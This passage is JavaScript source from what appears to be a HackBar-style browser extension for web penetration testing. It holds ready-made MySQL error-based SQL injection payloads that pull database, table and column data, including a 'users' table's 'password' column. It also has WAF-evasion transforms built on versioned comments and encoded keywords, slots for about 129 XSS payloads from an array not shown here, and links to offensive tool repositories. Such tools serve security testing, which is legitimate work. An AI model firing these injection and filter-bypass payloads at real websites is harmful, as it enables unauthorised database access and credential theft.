	txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema="+Encrypt.strToHex(temdbname)+"+AND+table_name="+Encrypt.strToHex(temtablename)+"+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
	this.setSelectedText(txt);
	break;

  case "getdata2":
  	var temdbname = prompt('Database Name','DATABASE()');
  	var temtablename = prompt('Table Name','users');
  	var temcolname = prompt('Column Name','password');
  	
  	if (!temdbname.localeCompare('DATABASE()')) {
  		txt = "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast("+temcolname+"+AS+CHAR),0x27,0x7e)+FROM+"+temtablename+"+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
  	}
	else{
  		txt = "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast("+temcolname+"+AS+CHAR),0x27,0x7e)+FROM+"+temdbname+'.'+temtablename+"+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
	}
	this.setSelectedText(txt);
	break;

  case "waf1":
  	var txt=this.getSelectedText();
	txt = txt.split(' ').join('/**/');
	txt='/*!'+txt+'*/';
	this.setSelectedText(txt);
	break;

  case "waf2":
  	var txt=this.getSelectedText();
	txt = txt.split(' ').join('+');
	txt='/*!50000'+txt+'*/';
	this.setSelectedText(txt);
	break;

  case "waf3":
  	var txt=this.getSelectedText();
	txt = txt.split(' ').join('+');
	txt='/*!12345'+txt+'*/';
	this.setSelectedText(txt);
	break;

  case "waf4":
  	var txt=this.getSelectedText();
	txt = txt.split(' ').join('+');
	txt='/*!13337'+txt+'*/';
	this.setSelectedText(txt);
	break;

  case "waf5":
	txt = "abcd";
	this.setSelectedText(txt);
	break;

  case "waf_gett":
	txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())";
	this.setSelectedText(txt);
	break;

  case "waf_getc":
    var temtablename = prompt('Table Name','users');
	txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/"+Encrypt.strToHex(temtablename)+")";
	this.setSelectedText(txt);
	break;

  case "waf_gettos":
	txt = "(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)";
	this.setSelectedText(txt);
	break;

  case "waf_getcos":
    var temtablename = prompt('Table Name','users');  
	txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/"+Encrypt.strToHex(temtablename)+')';
	this.setSelectedText(txt);
	break;

  case "html0":
	txt = "0x3c62723e";
	this.setSelectedText(txt);
	break;

  case "html1":
	txt = " separator 0x3c62723e";
	this.setSelectedText(txt);
	break;

  case "html2":
	txt = "0x3c6c693e";
	this.setSelectedText(txt);
	break;

  case "html3":
	txt = "0x3c623e";
	this.setSelectedText(txt);
	break;

  case "html4":
	txt = "0x3c2f623e";
	this.setSelectedText(txt);
	break;

  case "html5":
	txt = "0x3c666f6e7420666163653d636f75726965723e";
	this.setSelectedText(txt);
	break;

  case "html6":
	txt = "0x3c666f6e7420636f6c6f723d7265643e";
	this.setSelectedText(txt);
	break;

  case "html7":
	txt = "0x3c666f6e7420636f6c6f723d626c75653e";
	this.setSelectedText(txt);
	break;

  case "html8":
	txt = "0x3c666f6e7420636f6c6f723d677265656e3e";
	this.setSelectedText(txt);
	break;

  case "html9":
	txt = "0x3c666f6e7420636f6c6f723d707572706c653e";
	this.setSelectedText(txt);
	break;

  case "html10":
	txt = "0x3c666f6e7420636f6c6f723d6d6167656e74613e";
	this.setSelectedText(txt);
	break;

  case "html11":
	txt = "0x3c2f666f6e743e";
	this.setSelectedText(txt);
	break;

  case "xs0":
	txt = ar[0];
	this.setSelectedText(txt);
	break;

  case "xs1":
	txt = ar[1];
	this.setSelectedText(txt);
	break;

  case "xs2":
	txt = ar[2];
	this.setSelectedText(txt);
	break;

  case "xs3":
	txt = ar[3];
	this.setSelectedText(txt);
	break;

  case "xs4":
	txt = ar[4];
	this.setSelectedText(txt);
	break;

  case "xs5":
	txt = ar[5];
	this.setSelectedText(txt);
	break;

  case "xs6":
	txt = ar[6];
	this.setSelectedText(txt);
	break;

  case "xs7":
	txt = ar[7];
	this.setSelectedText(txt);
	break;

  case "xs8":
	txt = ar[8];
	this.setSelectedText(txt);
	break;

  case "xs9":
	txt = ar[9];
	this.setSelectedText(txt);
	break;

  case "xs10":
	txt = ar[10];
	this.setSelectedText(txt);
	break;

  case "xs11":
	txt = ar[11];
	this.setSelectedText(txt);
	break;

  case "xs12":
	txt = ar[12];
	this.setSelectedText(txt);
	break;

  case "xs13":
	txt = ar[13];
	this.setSelectedText(txt);
	break;

  case "xs14":
	txt = ar[14];
	this.setSelectedText(txt);
	break;

  case "xs15":
	txt = ar[15];
	this.setSelectedText(txt);
	break;

  case "xs16":
	txt = ar[16];
	this.setSelectedText(txt);
	break;

  case "xs17":
	txt = ar[17];
	this.setSelectedText(txt);
	break;

  case "xs18":
	txt = ar[18];
	this.setSelectedText(txt);
	break;

  case "xs19":
	txt = ar[19];
	this.setSelectedText(txt);
	break;

  case "xs20":
	txt = ar[20];
	this.setSelectedText(txt);
	break;

  case "xs21":
	txt = ar[21];
	this.setSelectedText(txt);
	break;

  case "xs22":
	txt = ar[22];
	this.setSelectedText(txt);
	break;

  case "xs23":
	txt = ar[23];
	this.setSelectedText(txt);
	break;

  case "xs24":
	txt = ar[24];
	this.setSelectedText(txt);
	break;

  case "xs25":
	txt = ar[25];
	this.setSelectedText(txt);
	break;

  case "xs26":
	txt = ar[26];
	this.setSelectedText(txt);
	break;

  case "xs27":
	txt = ar[27];
	this.setSelectedText(txt);
	break;

  case "xs28":
	txt = ar[28];
	this.setSelectedText(txt);
	break;

  case "xs29":
	txt = ar[29];
	this.setSelectedText(txt);
	break;

  case "xs30":
	txt = ar[30];
	this.setSelectedText(txt);
	break;

  case "xs31":
	txt = ar[31];
	this.setSelectedText(txt);
	break;

  case "xs32":
	txt = ar[32];
	this.setSelectedText(txt);
	break;

  case "xs33":
	txt = ar[33];
	this.setSelectedText(txt);
	break;

  case "xs34":
	txt = ar[34];
	this.setSelectedText(txt);
	break;

  case "xs35":
	txt = ar[35];
	this.setSelectedText(txt);
	break;

  case "xs36":
	txt = ar[36];
	this.setSelectedText(txt);
	break;

  case "xs37":
	txt = ar[37];
	this.setSelectedText(txt);
	break;

  case "xs38":
	txt = ar[38];
	this.setSelectedText(txt);
	break;

  case "xs39":
	txt = ar[39];
	this.setSelectedText(txt);
	break;

  case "xs40":
	txt = ar[40];
	this.setSelectedText(txt);
	break;

  case "xs41":
	txt = ar[41];
	this.setSelectedText(txt);
	break;

  case "xs42":
	txt = ar[42];
	this.setSelectedText(txt);
	break;

  case "xs43":
	txt = ar[43];
	this.setSelectedText(txt);
	break;

  case "xs44":
	txt = ar[44];
	this.setSelectedText(txt);
	break;

  case "xs45":
	txt = ar[45];
	this.setSelectedText(txt);
	break;

  case "xs46":
	txt = ar[46];
	this.setSelectedText(txt);
	break;

  case "xs47":
	txt = ar[47];
	this.setSelectedText(txt);
	break;

  case "xs48":
	txt = ar[48];
	this.setSelectedText(txt);
	break;

  case "xs49":
	txt = ar[49];
	this.setSelectedText(txt);
	break;

  case "xs50":
	txt = ar[50];
	this.setSelectedText(txt);
	break;

  case "xs51":
	txt = ar[51];
	this.setSelectedText(txt);
	break;

  case "xs52":
	txt = ar[52];
	this.setSelectedText(txt);
	break;

  case "xs53":
	txt = ar[53];
	this.setSelectedText(txt);
	break;

  case "xs54":
	txt = ar[54];
	this.setSelectedText(txt);
	break;

  case "xs55":
	txt = ar[55];
	this.setSelectedText(txt);
	break;

  case "xs56":
	txt = ar[56];
	this.setSelectedText(txt);
	break;

  case "xs57":
	txt = ar[57];
	this.setSelectedText(txt);
	break;

  case "xs58":
	txt = ar[58];
	this.setSelectedText(txt);
	break;

  case "xs59":
	txt = ar[59];
	this.setSelectedText(txt);
	break;

  case "xs60":
	txt = ar[60];
	this.setSelectedText(txt);
	break;

  case "xs61":
	txt = ar[61];
	this.setSelectedText(txt);
	break;

  case "xs62":
	txt = ar[62];
	this.setSelectedText(txt);
	break;

  case "xs63":
	txt = ar[63];
	this.setSelectedText(txt);
	break;

  case "xs64":
	txt = ar[64];
	this.setSelectedText(txt);
	break;

  case "xs65":
	txt = ar[65];
	this.setSelectedText(txt);
	break;

  case "xs66":
	txt = ar[66];
	this.setSelectedText(txt);
	break;

  case "xs67":
	txt = ar[67];
	this.setSelectedText(txt);
	break;

  case "xs68":
	txt = ar[68];
	this.setSelectedText(txt);
	break;

  case "xs69":
	txt = ar[69];
	this.setSelectedText(txt);
	break;

  case "xs70":
	txt = ar[70];
	this.setSelectedText(txt);
	break;

  case "xs71":
	txt = ar[71];
	this.setSelectedText(txt);
	break;

  case "xs72":
	txt = ar[72];
	this.setSelectedText(txt);
	break;

  case "xs73":
	txt = ar[73];
	this.setSelectedText(txt);
	break;

  case "xs74":
	txt = ar[74];
	this.setSelectedText(txt);
	break;

  case "xs75":
	txt = ar[75];
	this.setSelectedText(txt);
	break;

  case "xs76":
	txt = ar[76];
	this.setSelectedText(txt);
	break;

  case "xs77":
	txt = ar[77];
	this.setSelectedText(txt);
	break;

  case "xs78":
	txt = ar[78];
	this.setSelectedText(txt);
	break;

  case "xs79":
	txt = ar[79];
	this.setSelectedText(txt);
	break;

  case "xs80":
	txt = ar[80];
	this.setSelectedText(txt);
	break;

  case "xs81":
	txt = ar[81];
	this.setSelectedText(txt);
	break;

  case "xs82":
	txt = ar[82];
	this.setSelectedText(txt);
	break;

  case "xs83":
	txt = ar[83];
	this.setSelectedText(txt);
	break;

  case "xs84":
	txt = ar[84];
	this.setSelectedText(txt);
	break;

  case "xs85":
	txt = ar[85];
	this.setSelectedText(txt);
	break;

  case "xs86":
	txt = ar[86];
	this.setSelectedText(txt);
	break;

  case "xs87":
	txt = ar[87];
	this.setSelectedText(txt);
	break;

  case "xs88":
	txt = ar[88];
	this.setSelectedText(txt);
	break;

  case "xs89":
	txt = ar[89];
	this.setSelectedText(txt);
	break;

  case "xs90":
	txt = ar[90];
	this.setSelectedText(txt);
	break;

  case "xs91":
	txt = ar[91];
	this.setSelectedText(txt);
	break;

  case "xs92":
	txt = ar[92];
	this.setSelectedText(txt);
	break;

  case "xs93":
	txt = ar[93];
	this.setSelectedText(txt);
	break;

  case "xs94":
	txt = ar[94];
	this.setSelectedText(txt);
	break;

  case "xs95":
	txt = ar[95];
	this.setSelectedText(txt);
	break;

  case "xs96":
	txt = ar[96];
	this.setSelectedText(txt);
	break;

  case "xs97":
	txt = ar[97];
	this.setSelectedText(txt);
	break;

  case "xs98":
	txt = ar[98];
	this.setSelectedText(txt);
	break;

  case "xs99":
	txt = ar[99];
	this.setSelectedText(txt);
	break;

  case "xs100":
	txt = ar[100];
	this.setSelectedText(txt);
	break;

  case "xs101":
	txt = ar[101];
	this.setSelectedText(txt);
	break;

  case "xs102":
	txt = ar[102];
	this.setSelectedText(txt);
	break;

  case "xs103":
	txt = ar[103];
	this.setSelectedText(txt);
	break;

  case "xs104":
	txt = ar[104];
	this.setSelectedText(txt);
	break;

  case "xs105":
	txt = ar[105];
	this.setSelectedText(txt);
	break;

  case "xs106":
	txt = ar[106];
	this.setSelectedText(txt);
	break;

  case "xs107":
	txt = ar[107];
	this.setSelectedText(txt);
	break;

  case "xs108":
	txt = ar[108];
	this.setSelectedText(txt);
	break;

  case "xs109":
	txt = ar[109];
	this.setSelectedText(txt);
	break;

  case "xs110":
	txt = ar[110];
	this.setSelectedText(txt);
	break;

  case "xs111":
	txt = ar[111];
	this.setSelectedText(txt);
	break;

  case "xs112":
	txt = ar[112];
	this.setSelectedText(txt);
	break;

  case "xs113":
	txt = ar[113];
	this.setSelectedText(txt);
	break;

  case "xs114":
	txt = ar[114];
	this.setSelectedText(txt);
	break;

  case "xs115":
	txt = ar[115];
	this.setSelectedText(txt);
	break;

  case "xs116":
	txt = ar[116];
	this.setSelectedText(txt);
	break;

  case "xs117":
	txt = ar[117];
	this.setSelectedText(txt);
	break;

  case "xs118":
	txt = ar[118];
	this.setSelectedText(txt);
	break;

  case "xs119":
	txt = ar[119];
	this.setSelectedText(txt);
	break;

  case "xs120":
	txt = ar[120];
	this.setSelectedText(txt);
	break;

  case "xs121":
	txt = ar[121];
	this.setSelectedText(txt);
	break;

  case "xs122":
	txt = ar[122];
	this.setSelectedText(txt);
	break;

  case "xs123":
	txt = ar[123];
	this.setSelectedText(txt);
	break;

  case "xs124":
	txt = ar[124];
	this.setSelectedText(txt);
	break;

  case "xs125":
	txt = ar[125];
	this.setSelectedText(txt);
	break;

  case "xs126":
	txt = ar[126];
	this.setSelectedText(txt);
	break;

  case "xs127":
	txt = ar[127];
	this.setSelectedText(txt);
	break;

  case "xs128":
	txt = ar[128];
	this.setSelectedText(txt);
	break;

  case "link1":
	txt = "https://github.com/shadsidd";
	this.setSelectedText(txt);
	break;

  case "link2":
	txt = "https://www.shikari1337.com/list-of-xss-payloads-for-cross-site-scripting/";
	this.setSelectedText(txt);
	break;

  case "link3":
	txt = " https://github.com/xmendez/wfuzz";
	this.setSelectedText(txt);
	break;

  case "link4":
	txt = "https://github.com/minimaxir/big-list-of-naughty-strings";
	this.setSelectedText(txt);
	break;

  case "link5":
	txt = "https://github.com/xsscx/Commodity-Injection-Signatures";
	this.setSelectedText(txt);
	break;

  case "link6":
	txt = "https://github.com/TheRook/subbrute";
	this.setSelectedText(txt);
	break;

  case "link7":
	txt = "https://github.com/danielmiessler/RobotsDisallowed";
	this.setSelectedText(txt);
	break;

  case "link8":
	txt = "https://github.com/FireFart/HashCollision-DOS-POC";
	this.setSelectedText(txt);
	break;

  case "link9":
	txt = "https://github.com/HybrisDisaster/aspHashDoS";
	this.setSelectedText(txt);
	break;

  case "link10":
	txt = "https://github.com/UltimateHackers";
	this.setSelectedText(txt);
	break;



 }


 /* var dropdowns = document.getElementsByClassName("dropdown-content");
  var i;
  for (i = 0; i < dropdowns.length; i++) {
    var openDropdown = dropdowns[i];
    openDropdown.style.visibility = "hidden";
  }
  currentFocusField.focus();*/
}

/****** Load settings *****/

browser.tabs.query({windowId: myWindowId, active: true})
  .then((tabs) => {
    return browser.storage.local.get("hackbarsettings");
  })
  .then((storedInfo) => {
    if(storedInfo[Object.keys(storedInfo)[0]])
    {
      if(storedInfo[Object.keys(storedInfo)[0]][0]==true) // enable post data
      {
        postdataCbx.checked = true;
        togglepostdata();
      }
      if(storedInfo[Object.keys(storedInfo)[0]][1]==true) // enable referer 
      {
        refererCbx.checked = true;
        togglereferer();
      }
    }
  });

/***** Actions ************************/

function getSelectedText ()
{
  var selectionStart = this.currentFocusField.selectionStart;
  var selectionEnd = this.currentFocusField.selectionEnd;
  if ( selectionEnd - selectionStart < 1 ) {
    return prompt( "No text was selected for the requested action", "String to use" );
  } else {
    return this.currentFocusField.value.substr( selectionStart, selectionEnd - selectionStart );
  }
}

function setSelectedText ( str )
{
  var selectionStart = this.currentFocusField.selectionStart;
  var selectionEnd = this.currentFocusField.selectionEnd;
  var pre = this.currentFocusField.value.substr( 0, selectionStart );
  var post = this.currentFocusField.value.substr( selectionEnd, this.currentFocusField.value.length );
  this.currentFocusField.value = pre + str + post;
  this.currentFocusField.selectionStart = selectionStart;
  this.currentFocusField.selectionEnd = selectionStart + str.length;
}

function urlencode ( inputstr )
{
  var newString = escape(inputstr);
  newString = newString.replace(/\*/g,'%2a');
  newString = newString.replace(/\//g,'%2f');
  newString = newString.replace(/\+/g,'%2b');
  return newString;
}

function loadURL ()
{
  // urlfield.value = browser.tabs.getCurrent().url;
  browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
      //'tabs' will be an array with only one element: an Object describing the active tab
      //  in the current window.
      var currentTabUrl = tabs[0].url;
      urlfield.value = currentTabUrl;
      storedInfo = browser.storage.local.get(currentTabUrl);
      if(storedInfo) 
        postdatafield.value = storedInfo[Object.keys(storedInfo)[0]][1];
      else
        postdatafield.value = "";
  });
}

var typePostdata = "";
function getPostdata()
{
  if ((postdatafield.value || '').indexOf("Content-Disposition: form-data; name=") > -1) {
    typePostdata = "multipart";
    return postdatafield.value;
  }
  else if ((postdatafield.value || '').indexOf("&") > -1) {
    typePostdata = "formdata";
    var dataString = postdatafield.value;
    dataString = dataString.replace( new RegExp(/\n|\r/g), '' );
    dataString = dataString.replace( new RegExp(/\+/g), "%2B" );
    dataString = dataString.replace(new RegExp(/\=\=/g),"%3d%3d"); // for bas64 cases
    dataString = dataString.replace(new RegExp(/\=\&/g),"%3d&");   // for bas64 cases
    var fields = dataString.split('&');
    return fields;
  }
  else
  {
    typePostdata = "raw";
    return postdatafield.value;
  }
}

function rewriteReferer(e) {
  if (e.url != urlfield.value) return {};
  e.requestHeaders.push({
    name:   "Referer",
    value: refererfield.value
  });
  browser.webRequest.onBeforeSendHeaders.removeListener(rewriteReferer);
  return {requestHeaders: e.requestHeaders};
}

function execute ()
{
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = urlfield.value;
  arraycontent[1] = postdatafield.value;
  arraycontent[2] = refererfield.value;
  contentToStore[urlfield.value] = arraycontent;
  browser.storage.local.set(contentToStore);
  if (refererCbx.checked) {
    browser.webRequest.onBeforeSendHeaders.addListener(
      rewriteReferer,
      {urls: ["<all_urls>"], types: ["main_frame"]},
      ["blocking", "requestHeaders"]
    );
  }
  if (!postdataCbx.checked) { // just get method
    var updating = browser.tabs.update({url: urlfield.value});
    updating.then(null, null);
    return;
  }
  var postData = getPostdata();
  if (typePostdata == "formdata") 
  {
    var responsePost = "";
    var defVarCode = "var paramString='"+postdatafield.value+"'; var path='"+urlfield.value+"';";
    browser.tabs.executeScript({
        code: defVarCode
    }, function() {
        browser.tabs.executeScript({file: 'post.js'});
    });
  }
  else // for raw data and mutilpart formdata
  {
    var responsePost = "";
    var defVarCode = "var paramString = '"+postdatafield.value+"';"
    browser.tabs.executeScript({
        code: defVarCode
    }, function() {
        browser.tabs.executeScript({file: 'post.js'});
    });
  }
}

function splitUrl ()
{
  var uri = currentFocusField.value;
  uri = uri.replace(new RegExp(/&/g), "\n&");
  uri = uri.replace(new RegExp(/\?/g), "\n?");
  currentFocusField.value = uri;
  return true;
}

function savePostdata(requestDetails) {
  var datapost = "";
  if(requestDetails.method == "POST") {
    let formData = requestDetails.requestBody.formData;
    if(formData) {
      Object.keys(formData).forEach(key => {
        formData[key].forEach(value => {
          if(datapost!="") datapost = datapost + "&";
          datapost = datapost + key + "=" + value;
        });
      });
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = requestDetails.url;
  arraycontent[1] = datapost;
  if (requestDetails.originUrl) {
    arraycontent[2] = requestDetails.originUrl;
  }
  else {
    arraycontent[2] = "";
  }
  contentToStore[requestDetails.url] = arraycontent;
  browser.storage.local.set(contentToStore);

  return {};
}

function togglepostdata(){
  if(postdataCbx.checked){
    postdatafield.style.visibility = "visible";
    postdatafield.style.position = "relative";
    if(!browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.addListener(
        savePostdata,
        {urls: ["<all_urls>"], types: ["main_frame"]},
        ["requestBody"]
      );
    }
  } else {
    postdatafield.style.visibility = "hidden";
    postdatafield.style.position = "absolute";
    if(browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.removeListener(savePostdata);
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = postdataCbx.checked;
  arraycontent[1] = refererCbx.checked;
  contentToStore["hackbarsettings"] = arraycontent;
  browser.storage.local.set(contentToStore);
}

function togglereferer(){
  if(refererCbx.checked){
    refererfield.style.visibility = "visible";
    refererfield.style.position = "relative";
    if(!browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.addListener(
        savePostdata,
        {urls: ["<all_urls>"], types: ["main_frame"]},
        ["requestBody"]
      );
    }
  } else {
    refererfield.style.visibility = "hidden";
    refererfield.style.position = "absolute";
    if(browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.removeListener(savePostdata);
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = postdataCbx.checked;
  arraycontent[1] = refererCbx.checked;
  contentToStore["hackbarsettings"] = arraycontent;
  browser.storage.local.set(contentToStore);
}
